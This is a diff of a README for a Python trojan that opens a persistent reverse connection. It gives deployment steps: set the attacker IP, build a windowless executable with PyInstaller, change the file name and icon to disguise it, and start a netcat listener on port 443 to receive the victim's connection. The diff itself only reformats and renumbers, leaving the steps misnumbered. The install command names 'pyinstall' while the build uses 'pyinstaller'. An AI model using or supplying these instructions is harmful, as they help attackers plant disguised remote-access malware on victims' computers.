@@ -13,11 +13,13 @@ This is a basic trojan written in Python that establishes a persistent connectio
 1. Modify the IP (and, optionally, the port) of the code as needed.
    
 2. Install the pyinstall library that will be used to generate the executable file:
+
    ```
    pip install pyinstall
    ```
 
-3. Generate the executable:
+4. Generate the executable:
+
    ```
    pyinstaller -F --clean -w trojan.py
    ```
@@ -25,6 +27,7 @@ This is a basic trojan written in Python that establishes a persistent connectio
 Note: the file name can also be changed, as well as the icon. 
 
 4. The attacker must leave a port listening on his machine to receive the connection:
+   
    ```
    nc -lvp 443
    ```
